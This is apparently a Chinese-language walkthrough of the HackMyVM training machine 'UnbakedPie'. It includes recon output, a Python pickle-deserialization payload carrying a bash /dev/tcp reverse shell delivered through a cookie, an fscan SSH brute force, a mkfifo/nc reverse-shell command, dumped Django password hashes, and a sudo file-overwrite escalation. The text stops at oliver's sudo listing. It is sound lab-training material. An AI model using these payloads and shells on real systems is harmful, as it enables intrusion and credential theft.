---
title: UnbakedPie
author: hgbe02
date: 2024-09-12 19:20:38 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/UnbakedPie.html"
---

# UnbakedPie

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409121921139.png" alt="image-20240912141319179" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409121921140.png" alt="image-20240912175403360" style="zoom: 50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/UnbakedPie]
└─$ sudo nmap -Pn $IP -sT -sC -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-12 05:59 EDT
Nmap scan report for 192.168.10.101
Host is up (0.0015s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
5003/tcp open  filemaker?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 12 Sep 2024 10:00:34 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=1GqVxL3Xg2RAPEUtHsTjTI70ZYNyU2xzcxzW4C4Dz6gcNtRTI9yPieGHHZ5KnmEm; expires=Thu, 11 Sep 2025 10:00:34 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|     <link href="/static/vendor/fontawesome-free/css/all.min.cs
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 12 Sep 2024 10:00:34 GMT
|     Server: WSGIServer/0.2 CPython/3.8.6
|     Content-Type: text/html; charset=utf-8
|     X-Frame-Options: DENY
|     Vary: Cookie
|     Content-Length: 7453
|     X-Content-Type-Options: nosniff
|     Referrer-Policy: same-origin
|     Set-Cookie: csrftoken=VQn25UJjqBTqik38fcqFs20zpMtiRU5AoJUvuyG1X06sIHUpAh29nEhJyxKLzCBw; expires=Thu, 11 Sep 2025 10:00:34 GMT; Max-Age=31449600; Path=/; SameSite=Lax
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
|     <meta name="description" content="">
|     <meta name="author" content="">
|     <title>[Un]baked | /</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom fonts for this template -->
|_    <link href="/static/vendor/fontawesome-free/css/all.min.cs
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5003-TCP:V=7.94SVN%I=7%D=9/12%Time=66E2BBBB%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,1EC5,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2012\x20Sep\
SF:x202024\x2010:00:34\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.
SF:8\.6\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options
SF::\x20DENY\r\nVary:\x20Cookie\r\nContent-Length:\x207453\r\nX-Content-Ty
SF:pe-Options:\x20nosniff\r\nReferrer-Policy:\x20same-origin\r\nSet-Cookie
SF::\x20\x20csrftoken=1GqVxL3Xg2RAPEUtHsTjTI70ZYNyU2xzcxzW4C4Dz6gcNtRTI9yP
SF:ieGHHZ5KnmEm;\x20expires=Thu,\x2011\x20Sep\x202025\x2010:00:34\x20GMT;\
SF:x20Max-Age=31449600;\x20Path=/;\x20SameSite=Lax\r\n\r\n\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n\n<head>\n\n\x20\x20<meta\x20charset=\"utf
SF:-8\">\n\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-wid
SF:th,\x20initial-scale=1,\x20shrink-to-fit=no\">\n\x20\x20<meta\x20name=\
SF:"description\"\x20content=\"\">\n\x20\x20<meta\x20name=\"author\"\x20co
SF:ntent=\"\">\n\n\x20\x20<title>\[Un\]baked\x20\|\x20/</title>\n\n\x20\x2
SF:0<!--\x20Bootstrap\x20core\x20CSS\x20-->\n\x20\x20<link\x20href=\"/stat
SF:ic/vendor/bootstrap/css/bootstrap\.min\.css\"\x20rel=\"stylesheet\">\n\
SF:n\x20\x20<!--\x20Custom\x20fonts\x20for\x20this\x20template\x20-->\n\x2
SF:0\x20<link\x20href=\"/static/vendor/fontawesome-free/css/all\.min\.cs")
SF:%r(HTTPOptions,1EC5,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Thu,\x2012\x20S
SF:ep\x202024\x2010:00:34\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/
SF:3\.8\.6\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Opti
SF:ons:\x20DENY\r\nVary:\x20Cookie\r\nContent-Length:\x207453\r\nX-Content
SF:-Type-Options:\x20nosniff\r\nReferrer-Policy:\x20same-origin\r\nSet-Coo
SF:kie:\x20\x20csrftoken=VQn25UJjqBTqik38fcqFs20zpMtiRU5AoJUvuyG1X06sIHUpA
SF:h29nEhJyxKLzCBw;\x20expires=Thu,\x2011\x20Sep\x202025\x2010:00:34\x20GM
SF:T;\x20Max-Age=31449600;\x20Path=/;\x20SameSite=Lax\r\n\r\n\n<!DOCTYPE\x
SF:20html>\n<html\x20lang=\"en\">\n\n<head>\n\n\x20\x20<meta\x20charset=\"
SF:utf-8\">\n\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-
SF:width,\x20initial-scale=1,\x20shrink-to-fit=no\">\n\x20\x20<meta\x20nam
SF:e=\"description\"\x20content=\"\">\n\x20\x20<meta\x20name=\"author\"\x2
SF:0content=\"\">\n\n\x20\x20<title>\[Un\]baked\x20\|\x20/</title>\n\n\x20
SF:\x20<!--\x20Bootstrap\x20core\x20CSS\x20-->\n\x20\x20<link\x20href=\"/s
SF:tatic/vendor/bootstrap/css/bootstrap\.min\.css\"\x20rel=\"stylesheet\">
SF:\n\n\x20\x20<!--\x20Custom\x20fonts\x20for\x20this\x20template\x20-->\n
SF:\x20\x20<link\x20href=\"/static/vendor/fontawesome-free/css/all\.min\.c
SF:s");
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/temp/UnbakedPie]
└─$ feroxbuster -u http://$IP:5003 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 3 -s 200 301 302
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.10.101:5003
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 301, 302]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 3
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      165l      384w     5457c http://192.168.10.101:5003/german-chocolate-pie
200      GET        7l     1029w    81084c http://192.168.10.101:5003/static/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET        5l       83w    58578c http://192.168.10.101:5003/static/vendor/fontawesome-free/css/all.min.css
200      GET        7l       26w     1092c http://192.168.10.101:5003/static/js/clean-blog.min.js
200      GET      157l      433w     5619c http://192.168.10.101:5003/blueberry-pie
200      GET      162l      511w     6150c http://192.168.10.101:5003/homemade-pickle
200      GET      141l      343w     4949c http://192.168.10.101:5003/about
200      GET      323l     1639w   150557c http://192.168.10.101:5003/media/apple-pie.jpg
200      GET        5l      169w     6376c http://192.168.10.101:5003/static/css/clean-blog.min.css
200      GET      163l      488w     5958c http://192.168.10.101:5003/pickle-pie
200      GET      366l     2045w   188693c http://192.168.10.101:5003/media/bluberry-pie.jpg
200      GET        2l     1297w    89476c http://192.168.10.101:5003/static/vendor/jquery/jquery.min.js
200      GET        7l     2102w   160403c http://192.168.10.101:5003/static/vendor/bootstrap/css/bootstrap.min.css
200      GET      832l     3648w   310445c http://192.168.10.101:5003/media/429048911_6028786357001_6028781673001-vs.jpg
200      GET        0l        0w    78946c http://192.168.10.101:5003/media/best-homemade-refrigerator-pickles-21.jpg
200      GET        0l        0w   201616c http://192.168.10.101:5003/media/germanchocolatepie.jpg
200      GET      225l      514w     7453c http://192.168.10.101:5003/
301      GET        0l        0w        0c http://192.168.10.101:5003/accounts/signup => http://192.168.10.101:5003/accounts/signup/
301      GET        0l        0w        0c http://192.168.10.101:5003/accounts/login => http://192.168.10.101:5003/accounts/login/
302      GET        0l        0w        0c http://192.168.10.101:5003/share => accounts/login?next=/share
```

没有继续扫下去了，如果等一下找不到突破口再扫描吧。

## 漏洞发现

### 踩点

```bash
┌──(kali💀kali)-[~/temp/UnbakedPie]
└─$ curl -is http://$IP:5003                                                                                          
HTTP/1.1 200 OK
Date: Thu, 12 Sep 2024 10:01:23 GMT
Server: WSGIServer/0.2 CPython/3.8.6
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Vary: Cookie
Content-Length: 7453
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie:  csrftoken=sLJZaCVfzmB8xU5b8mxMAn3yTVyJQUVPDKwW5QhJ1ujLJRXGlcycTmP8c7n4zMp9; expires=Thu, 11 Sep 2025 10:01:23 GMT; Max-Age=31449600; Path=/; SameSite=Lax


<!DOCTYPE html>
<html lang="en">

<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">

  <title>[Un]baked | /</title>

  <!-- Bootstrap core CSS -->
  .................
    <!-- Bootstrap core JavaScript -->
  <script src="/static/vendor/jquery/jquery.min.js"></script>
  <script src="/static/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

  <!-- Custom scripts for this template -->
  <script src="/static/js/clean-blog.min.js"></script>

</body>

</html>
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409121921141.png" alt="image-20240912180246579" style="zoom: 33%;" />

尝试搜索，发现源代码数据非常多，还有不少的隐藏信息：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409121921142.png" alt="image-20240912181005337" style="zoom:50%;" />

pickle 反序列化？

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409121921143.png" alt="image-20240912181041339" style="zoom: 50%;" />

知道了版本信息，`Django Version: 3.1.2 Python Version: 3.8.6`

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409121921144.png" alt="image-20240912181338926" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409121921146.png" alt="image-20240912181436818" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409121921147.png" alt="image-20240912181420939" style="zoom:50%;" />

发现了一个cookie？

```bash
# gASVCAAAAAAAAACMBHRlc3SULg==
┌──(kali💀kali)-[~/temp/UnbakedPie]
└─$ echo 'gASVCAAAAAAAAACMBHRlc3SULg==' | base64 -d                            
��test�.
```

尝试一下`pickle`反序列化，看是否和上面表示一样！

```python
import pickle
import base64
import os

class PickleCommandExec:
    def __reduce__(self):
        command = ('test')
        return os.system, (command,)
        
if __name__ == '__main__':
    pickled = pickle.dumps(PickleCommandExec())
    print(base64.urlsafe_b64encode(pickled))

# b'gASVHwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAR0ZXN0lIWUUpQu'
```

看上去还蛮像的，尝试一下是否可以执行命令！

```python
import pickle
import base64
import os

class PickleCommandExec:
    def __reduce__(self):
        command = ('bash -c "exec bash -i &>/dev/tcp/192.168.10.102/1234 <&1"')
        return os.system, (command,)
        
if __name__ == '__main__':
    pickled = pickle.dumps(PickleCommandExec())
    print(base64.urlsafe_b64encode(pickled))
# b'gASVVAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDliYXNoIC1jICJleGVjIGJhc2ggLWkgJj4vZGV2L3RjcC8xOTIuMTY4LjEwLjEwMi8xMjM0IDwmMSKUhZRSlC4='
```

尝试激活一下：

```
curl -is http://$IP:5003/search -b "search_cookie=gASVVAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDliYXNoIC1jICJleGVjIGJhc2ggLWkgJj4vZGV2L3RjcC8xOTIuMTY4LjEwLjEwMi8xMjM0IDwmMSKUhZRSlC4="
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409121921148.png" alt="image-20240912183400034" style="zoom:50%;" />

一步到位？

## 提权

### docker逃逸

```bash
(remote) root@8b39a559b296:/home# whoami;id
root
uid=0(root) gid=0(root) groups=0(root)
(remote) root@8b39a559b296:/home# cd /root
(remote) root@8b39a559b296:/root# ls -la
total 36
drwx------ 1 root root 4096 Oct  3  2020 .
drwxr-xr-x 1 root root 4096 Oct  3  2020 ..
-rw------- 1 root root  805 Oct  5  2020 .bash_history
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
drwxr-xr-x 3 root root 4096 Oct  3  2020 .cache
drwxr-xr-x 3 root root 4096 Oct  3  2020 .local
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rw------- 1 root root    0 Sep 24  2020 .python_history
drwx------ 2 root root 4096 Oct  3  2020 .ssh
-rw-r--r-- 1 root root  254 Oct  3  2020 .wget-hsts
(remote) root@8b39a559b296:/root# cat .bash_history 
nc
exit
ifconfig
ip addr
ssh 172.17.0.1
ssh 172.17.0.2
exit
ssh ramsey@172.17.0.1
exit
cd /tmp
wget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh
chmod +x check-config.sh
./check-config.sh 
nano /etc/default/grub
vi /etc/default/grub
apt install vi
apt update
apt install vi
apt install vim
apt install nano
nano /etc/default/grub
grub-update
apt install grub-update
apt-get install --reinstall grub
grub-update
exit
ssh ramsey@172.17.0.1
exit
ssh ramsey@172.17.0.1
exit
ls
cd site/
ls
cd bakery/
ls
nano settings.py 
exit
ls
cd site/
ls
cd bakery/
nano settings.py 
exit
apt remove --purge ssh
ssh
apt remove --purge autoremove open-ssh*
apt remove --purge autoremove openssh=*
apt remove --purge autoremove openssh-*
ssh
apt autoremove openssh-client
clear
ssh
ssh
ssh
exit
(remote) root@8b39a559b296:/root# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
(remote) root@8b39a559b296:/root# ls -la /home
total 28
drwxr-xr-x 1 root root 4096 Oct  3  2020 .
drwxr-xr-x 1 root root 4096 Oct  3  2020 ..
drwxrwxr-x 8 root root 4096 Oct  3  2020 .git
drwxrwxr-x 2 root root 4096 Oct  3  2020 .vscode
-rwxrwxr-x 1 root root   95 Oct  3  2020 requirements.sh
-rwxrwxr-x 1 root root   46 Oct  3  2020 run.sh
drwxrwxr-x 1 root root 4096 Oct  3  2020 site
(remote) root@8b39a559b296:/root# cd /home
(remote) root@8b39a559b296:/home# cat run.sh 
python3 site/manage.py runserver 0.0.0.0:5003
```

发现一处`ramsey@172.17.0.1`，可能用得上：

尝试上传`linpeas.sh`：

```bash
(remote) root@8b39a559b296:/home# cd /tmp
(remote) root@8b39a559b296:/tmp# 
(local) pwncat$ local pwd
/home/kali/temp/UnbakedPie
(local) pwncat$ lcd ..
(local) pwncat$ lpwd
/home/kali/temp
(local) pwncat$ upload linpeas.sh
./linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 860.5/860.5 KB • ? • 0:00:00[06:38:54] uploaded 860.55KiB in 1.80 seconds                                                                                                                                    upload.py:76
(local) pwncat$                                                                                                                                                                              
(remote) root@8b39a559b296:/tmp# chmod +x *
(remote) root@8b39a559b296:/tmp# ./linpeas.sh 
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409121921149.png" alt="image-20240912184002658" style="zoom:50%;" />

发现我们在一处docker容器里面，尝试逃逸，寻找相关信息，发现存在很多的漏洞，例如`/etc/passwd`可写之类的，但是对我们下一步没帮助(*\^_^\*)：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409121921150.png" alt="image-20240912184159571" style="zoom: 50%;" />

尝试读取一下这个数据库：

```bash
(remote) root@8b39a559b296:/tmp# cd /home/site
(remote) root@8b39a559b296:/home/site# ls -la
total 184
drwxrwxr-x 1 root root   4096 Oct  3  2020 .
drwxr-xr-x 1 root root   4096 Oct  3  2020 ..
drwxrwxr-x 1 root root   4096 Oct  3  2020 account
drwxrwxr-x 8 root root   4096 Oct  3  2020 assets
drwxrwxr-x 1 root root   4096 Oct  3  2020 bakery
-rw-r--r-- 1 root root 151552 Oct  3  2020 db.sqlite3
drwxrwxr-x 1 root root   4096 Oct  3  2020 homepage
-rwxrwxr-x 1 root root    662 Oct  3  2020 manage.py
drwxrwxr-x 2 root root   4096 Oct  3  2020 media
drwxrwxr-x 3 root root   4096 Oct  3  2020 templates
(remote) root@8b39a559b296:/home/site# sqlite3 db.sqlite3
bash: sqlite3: command not found
```

下载到本地进行读取：

```bash
┌──(kali💀kali)-[~/temp/UnbakedPie]
└─$ sqlite3 db.sqlite3                                                                                                                     
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
auth_group                  django_admin_log          
auth_group_permissions      django_content_type       
auth_permission             django_migrations         
auth_user                   django_session            
auth_user_groups            homepage_article          
auth_user_user_permissions
sqlite> select * from auth_user
   ...> ;
1|pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=|2020-10-03 10:43:47.229292|1|aniqfakhrul|||1|1|2020-10-02 04:50:52.424582|
11|pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=|2020-10-02 10:16:45.805533|0|testing|||0|1|2020-10-02 10:16:45.686339|
12|pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=|2020-10-03 10:44:10.758867|0|ramsey|||0|1|2020-10-02 14:42:44.388799|
13|pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=|2020-10-02 14:42:59.192571|0|oliver|||0|1|2020-10-02 14:42:59.113998|
14|pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=|2020-10-02 14:43:15.187554|0|wan|||0|1|2020-10-02 14:43:15.102863|
sqlite> select username, password from auth_user;
aniqfakhrul|pbkdf2_sha256$216000$3fIfQIweKGJy$xFHY3JKtPDdn/AktNbAwFKMQnBlrXnJyU04GElJKxEo=
testing|pbkdf2_sha256$216000$0qA6zNH62sfo$8ozYcSpOaUpbjPJz82yZRD26ZHgaZT8nKWX+CU0OfRg=
ramsey|pbkdf2_sha256$216000$hyUSJhGMRWCz$vZzXiysi8upGO/DlQy+w6mRHf4scq8FMnc1pWufS+Ik=
oliver|pbkdf2_sha256$216000$Em73rE2NCRmU$QtK5Tp9+KKoP00/QV4qhF3TWIi8Ca2q5gFCUdjqw8iE=
wan|pbkdf2_sha256$216000$oFgeDrdOtvBf$ssR/aID947L0jGSXRrPXTGcYX7UkEBqWBzC+Q2Uq+GY=
```

尝试爆破密码，但是未果。参考墨师傅的blog，使用 `fscan`完成ssh接下来的工作：https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan.exe

```bash
(remote) root@8b39a559b296:/tmp# nc -znv 172.17.0.1 22
(UNKNOWN) [172.17.0.1] 22 (ssh) open
(remote) root@8b39a559b296:/tmp# nc -znv 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 5003 (?) open
(UNKNOWN) [172.17.0.1] 22 (ssh) open
```

说明`22`端口只允许内部进行连接：

```bash
(remote) root@8b39a559b296:/tmp# 
(local) pwncat$ lcd ..
(local) pwncat$ upload fscan
./fscan ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 24.8/24.8 MB • 3.6 MB/s • 0:00:00[06:57:41] uploaded 24.76MiB in 8.24 seconds                                                                                                                                     upload.py:76
(local) pwncat$                                                                                                                                                                              
(remote) root@8b39a559b296:/tmp# chmod +x *\
(remote) root@8b39a559b296:/tmp# ./fscan -h 172.17.0.1 -user ramsey
./fscan: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32' not found (required by ./fscan)
./fscan: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./fscan)
```

尝试更换版本：https://github.com/shadow1ng/fscan/releases/download/1.3.1/fscan_amd64

```bash
(remote) root@8b39a559b296:/tmp# ./fscan_amd64 -h 172.17.0.1 -user ramsey


   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
scan start
(ICMP) Target '172.17.0.1' is alive
icmp alive hosts len is: 1
172.17.0.1:22 open
SSH:172.17.0.1:22:ramsey 12345678
scan end
```

尝试连接反弹shell！

```bash
./fscan_amd64 -h 172.17.0.1 -user ramsey -pwd "12345678" -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.10.102 1234 >/tmp/f"
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409121921151.png" alt="image-20240912191135535" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409121921152.png" alt="image-20240912191144759" style="zoom: 50%;" />

### 覆盖文件提权

```bash
(remote) ramsey@unbaked:/home/ramsey$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
ramsey:x:1001:1001::/home/ramsey:/bin/bash
oliver:x:1002:1002::/home/oliver:/bin/bash
(remote) ramsey@unbaked:/home/ramsey$ sudo -l
[sudo] password for ramsey: 
Matching Defaults entries for ramsey on unbaked:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ramsey may run the following commands on unbaked:
    (oliver) /usr/bin/python /home/ramsey/vuln.py
(remote) ramsey@unbaked:/home/ramsey$ cat /home/ramsey/vuln.py
#!/usr/bin/python
# coding=utf-8

try:
    from PIL import Image
except ImportError:
    import Image
import pytesseract
import sys
import os
import time


#Header
def header():
        banner = '''\033[33m                                             
                                      (
                                       )
                                  __..---..__
                              ,-='  /  |  \  `=-.
                             :--..___________..--;
                              \.,_____________,./
                 

██╗███╗   ██╗ ██████╗ ██████╗ ███████╗██████╗ ██╗███████╗███╗   ██╗████████╗███████╗
██║████╗  ██║██╔════╝ ██╔══██╗██╔════╝██╔══██╗██║██╔════╝████╗  ██║╚══██╔══╝██╔════╝
██║██╔██╗ ██║██║  ███╗██████╔╝█████╗  ██║  ██║██║█████╗  ██╔██╗ ██║   ██║   ███████╗
██║██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ██║  ██║██║██╔══╝  ██║╚██╗██║   ██║   ╚════██║
██║██║ ╚████║╚██████╔╝██║  ██║███████╗██████╔╝██║███████╗██║ ╚████║   ██║   ███████║
╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝
\033[m'''
        return banner

#Function Instructions
def instructions():
        print "\n\t\t\t",9 * "-" , "WELCOME!" , 9 * "-"
        print "\t\t\t","1. Calculator"
        print "\t\t\t","2. Easy Calculator"
        print "\t\t\t","3. Credits"
        print "\t\t\t","4. Exit"
        print "\t\t\t",28 * "-"

def instructions2():
        print "\n\t\t\t",9 * "-" , "CALCULATOR!" , 9 * "-"
        print "\t\t\t","1. Add"
        print "\t\t\t","2. Subtract"
        print "\t\t\t","3. Multiply"
        print "\t\t\t","4. Divide"
        print "\t\t\t","5. Back"
        print "\t\t\t",28 * "-"

def credits():
        print "\n\t\tHope you enjoy learning new things  - Ch4rm & H0j3n\n"

# Function Arithmetic

# Function to add two numbers  
def add(num1, num2): 
    return num1 + num2 
  
# Function to subtract two numbers  
def subtract(num1, num2): 
    return num1 - num2 
  
# Function to multiply two numbers 
def multiply(num1, num2): 
    return num1 * num2 
  
# Function to divide two numbers 
def divide(num1, num2): 
    return num1 / num2 
# Main    
if __name__ == "__main__":
        print header()

        #Variables
        OPTIONS = 0
        OPTIONS2 = 0
        TOTAL = 0
        NUM1 = 0
        NUM2 = 0

        while(OPTIONS != 4):
                instructions()
                OPTIONS = int(input("\t\t\tEnter Options >> "))
                print "\033c"
                if OPTIONS == 1:
                        instructions2()
                        OPTIONS2 = int(input("\t\t\tEnter Options >> "))
                        print "\033c"
                        if OPTIONS2 == 5:
                                continue
                        else:
                                NUM1 = int(input("\t\t\tEnter Number1 >> "))
                                NUM2 = int(input("\t\t\tEnter Number2 >> "))
                                if OPTIONS2 == 1:
                                        TOTAL = add(NUM1,NUM2)
                                if OPTIONS2 == 2:
                                        TOTAL = subtract(NUM1,NUM2)
                                if OPTIONS2 == 3:
                                        TOTAL = multiply(NUM1,NUM2)
                                if OPTIONS2 == 4:
                                        TOTAL = divide(NUM1,NUM2)
                                print "\t\t\tTotal >> $",TOTAL
                if OPTIONS == 2:
                        animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

                        print "\r\t\t\t     Waiting to extract..."
                        for i in range(len(animation)):
                            time.sleep(0.5)
                            sys.stdout.write("\r\t\t\t         " + animation[i % len(animation)])
                            sys.stdout.flush()

                        LISTED = pytesseract.image_to_string(Image.open('payload.png')) 

                        TOTAL = eval(LISTED)
                        print "\n\n\t\t\tTotal >> $",TOTAL
                if OPTIONS == 3:
                        credits()
        sys.exit(-1)
```

虽然看上去不可以修改，但是由于其在家目录下所以就是案板上的肉了：

```bash
(remote) ramsey@unbaked:/home/ramsey$ ls -la /home/ramsey/vuln.py
-rw-r--r-- 1 root ramsey 4369 Oct  3  2020 /home/ramsey/vuln.py
```

直接覆盖掉，然后执行！

```bash
(remote) ramsey@unbaked:/home/ramsey$ mv vuln.py vuln.py.bak
(remote) ramsey@unbaked:/home/ramsey$ echo 'import pty;pty.spawn("/bin/bash")' > vuln.py
(remote) ramsey@unbaked:/home/ramsey$ chmod +x vuln.py
(remote) ramsey@unbaked:/home/ramsey$ sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
oliver@unbaked:~$ 
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202409121921153.png" alt="image-20240912191720457" style="zoom:50%;" />

### 提权

```bash
oliver@unbaked:~$ sudo -l
Matching Defaults entries for oliver on unbaked:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User oliver may run the following commands on unbaked:
